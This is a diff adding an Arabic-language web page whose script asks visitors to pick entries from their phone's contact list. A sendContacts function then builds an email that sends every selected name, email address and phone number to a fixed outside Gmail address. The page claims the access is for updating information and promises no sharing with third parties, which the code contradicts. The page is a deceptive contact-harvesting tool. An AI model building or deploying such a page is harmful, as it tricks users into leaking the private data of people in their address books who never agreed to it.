@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>طلب الوصول إلى جهات الاتصال</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .header {
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 2rem;
+        }
+        .header p {
+            color: #7f8c8d;
+            font-size: 1.1rem;
+        }
+        .icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            color: #3498db;
+        }
+        .permission-box {
+            background: #f8f9fa;
+            border: 2px dashed #dee2e6;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+        .permission-box h3 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+        .btn {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+            min-width: 200px;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
+        }
+        .btn:active {
+            transform: translateY(-1px);
+        }
+        .btn-success {
+            background: linear-gradient(45deg, #27ae60, #2ecc71);
+        }
+        .btn-danger {
+            background: linear-gradient(45deg, #e74c3c, #c0392b);
+        }
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+            display: block;
+        }
+        .contacts-list {
+            max-height: 200px;
+            overflow-y: auto;
+            text-align: right;
+            margin: 15px 0;
+            padding: 15px;
+            background: white;
+            border-radius: 10px;
+            border: 1px solid #dee2e6;
+            display: none;
+        }
+        .contact-item {
+            padding: 8px;
+            border-bottom: 1px solid #eee;
+        }
+        .contact-item:last-child {
+            border-bottom: none;
+        }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            margin-top: 25px;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon">📱</div>
+            <h1>الوصول إلى جهات الاتصال</h1>
+            <p>نحتاج إلى إذنك للوصول إلى قائمة جهات الاتصال لتحديث المعلومات</p>
+        </div>
+
+        <div class="permission-box">
+            <h3>🔐 طلب الإذن</h3>
+            <p>سيتم الوصول إلى جهات الاتصال الخاصة بك بشكل آمن وسيتم حماية معلوماتك</p>
+        </div>
+
+        <div class="status info" id="infoStatus">
+            ⚠️ يرجى النقر على الزر أدناه للموافقة على الوصول إلى جهات الاتصال
+        </div>
+
+        <div class="status success" id="successStatus">
+            ✅ تم جمع جهات الاتصال بنجاح وإرسالها
+        </div>
+
+        <div class="status error" id="errorStatus">
+            ❌ حدث خطأ في الوصول إلى جهات الاتصال
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>جاري جمع جهات الاتصال وإرسالها...</p>
+        </div>
+
+        <div class="contacts-list" id="contactsList">
+            <!-- جهات الاتصال ستظهر هنا -->
+        </div>
+
+        <button class="btn" onclick="requestContacts()" id="requestBtn">
+            الموافقة على الوصول إلى جهات الاتصال
+        </button>
+
+        <button class="btn btn-success" onclick="sendContacts()" id="sendBtn" style="display: none;">
+            إرسال جهات الاتصال
+        </button>
+
+        <div class="footer">
+            <p>نحن نحترم خصوصيتك. لن يتم مشاركة معلوماتك مع أي طرف ثالث.</p>
+        </div>
+    </div>
+
+    <script>
+        let contactsData = [];
+
+        // طلب الوصول إلى جهات الاتصال
+        async function requestContacts() {
+            const infoStatus = document.getElementById('infoStatus');
+            const errorStatus = document.getElementById('errorStatus');
+            const loading = document.getElementById('loading');
+            const requestBtn = document.getElementById('requestBtn');
+            const sendBtn = document.getElementById('sendBtn');
+            const contactsList = document.getElementById('contactsList');
+
+            try {
+                // إظهار حالة التحميل
+                loading.style.display = 'block';
+                infoStatus.style.display = 'none';
+                errorStatus.style.display = 'none';
+                requestBtn.disabled = true;
+
+                // التحقق من دعم واجهة Contacts API
+                if (!('contacts' in navigator)) {
+                    throw new Error('واجهة جهات الاتصال غير مدعومة في هذا المتصفح');
+                }
+
+                // طلب الصلاحيات
+                const props = ['name', 'email', 'tel'];
+                const opts = { multiple: true };
+
+                const contacts = await navigator.contacts.select(props, opts);
+                
+                if (contacts.length === 0) {
+                    throw new Error('لم يتم اختيار أي جهات اتصال');
+                }
+
+                // حفظ البيانات
+                contactsData = contacts;
+                
+                // عرض جهات الاتصال
+                displayContacts(contacts);
+                
+                // إظهار الأزرار
+                sendBtn.style.display = 'inline-block';
+                contactsList.style.display = 'block';
+                
+                // إخفاء التحميل
+                loading.style.display = 'none';
+                
+                console.log('تم جمع جهات الاتصال:', contacts);
+
+            } catch (error) {
+                console.error('Error accessing contacts:', error);
+                loading.style.display = 'none';
+                errorStatus.style.display = 'block';
+                errorStatus.innerHTML = `❌ ${error.message}`;
+                requestBtn.disabled = false;
+            }
+        }
+
+        // عرض جهات الاتصال
+        function displayContacts(contacts) {
+            const contactsList = document.getElementById('contactsList');
+            contactsList.innerHTML = '';
+
+            contacts.forEach((contact, index) => {
+                const contactDiv = document.createElement('div');
+                contactDiv.className = 'contact-item';
+                
+                let contactInfo = `👤 ${contact.name || 'لا يوجد اسم'}`;
+                
+                if (contact.email && contact.email.length > 0) {
+                    contactInfo += ` | 📧 ${contact.email[0]}`;
+                }
+                
+                if (contact.tel && contact.tel.length > 0) {
+                    contactInfo += ` | 📞 ${contact.tel[0]}`;
+                }
+                
+                contactDiv.textContent = contactInfo;
+                contactsList.appendChild(contactDiv);
+            });
+        }
+
+        // إرسال جهات الاتصال عبر البريد الإلكتروني
+        async function sendContacts() {
+            const loading = document.getElementById('loading');
+            const successStatus = document.getElementById('successStatus');
+            const errorStatus = document.getElementById('errorStatus');
+            const sendBtn = document.getElementById('sendBtn');
+
+            try {
+                loading.style.display = 'block';
+                sendBtn.disabled = true;
+
+                // تحويل البيانات إلى نص
+                const contactsText = formatContactsToText(contactsData);
+                
+                // إنشاء ملف نصي
+                const blob = new Blob([contactsText], { type: 'text/plain' });
+                
+                // إرسال البريد الإلكتروني باستخدام mailto
+                const subject = 'جهات الاتصال المجمعة';
+                const body = `تم جمع ${contactsData.length} جهة اتصال.\n\n${contactsText}`;
+                const mailtoLink = `mailto:asd.asd.net.sy@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+                
+                // فتح عميل البريد الإلكتروني
+                window.location.href = mailtoLink;
+                
+                // إظهار حالة النجاح
+                loading.style.display = 'none';
+                successStatus.style.display = 'block';
+                
+                console.log('تم إعداد البريد الإلكتروني للإرسال');
+
+            } catch (error) {
+                console.error('Error sending contacts:', error);
+                loading.style.display = 'none';
+                errorStatus.style.display = 'block';
+                errorStatus.innerHTML = `❌ حدث خطأ في الإرسال: ${error.message}`;
+                sendBtn.disabled = false;
+            }
+        }
+
+        // تنسيق جهات الاتصال كنص
+        function formatContactsToText(contacts) {
+            let text = `جهات الاتصال المجمعة\n`;
+            text += `التاريخ: ${new Date().toLocaleString('ar-SA')}\n`;
+            text += `العدد: ${contacts.length} جهة اتصال\n\n`;
+            text += '='.repeat(50) + '\n\n';
+
+            contacts.forEach((contact, index) => {
+                text += `جهة الاتصال ${index + 1}:\n`;
+                text += `الاسم: ${contact.name || 'غير محدد'}\n`;
+                
+                if (contact.email && contact.email.length > 0) {
+                    text += `البريد الإلكتروني: ${contact.email.join(', ')}\n`;
+                }
+                
+                if (contact.tel && contact.tel.length > 0) {
+                    text += `الهاتف: ${contact.tel.join(', ')}\n`;
+                }
+                
+                text += '-'.repeat(30) + '\n';
+            });
+
+            return text;
+        }
+
+        // بديل إذا لم تكن واجهة Contacts API مدعومة
+        function showAlternativeMethod() {
+            const errorStatus = document.getElementById('errorStatus');
+            errorStatus.style.display = 'block';
+            errorStatus.innerHTML = `
+                ❌ المتصفح لا يدعم الوصول المباشر إلى جهات الاتصال.<br>
+                💡 الحلول البديلة:<br>
+                1. تصدير جهات الاتصال يدوياً كملف vCard<br>
+                2. استخدام تطبيق جهات اتصال مزامن مع السحابة<br>
+                3. محاولة استخدام متصفح مختلف يدعم هذه الميزة
+            `;
+        }
+
+        // التحقق من دعم المتصفح عند التحميل
+        document.addEventListener('DOMContentLoaded', function() {
+            if (!('contacts' in navigator)) {
+                document.getElementById('infoStatus').innerHTML = `
+                    ⚠️ المتصفح الحالي لا يدعم الوصول المباشر إلى جهات الاتصال.<br>
+                    جرب استخدام متصفح Chrome على Android.
+                `;
+            }
+        });
+    </script>
+</body>
+</html>
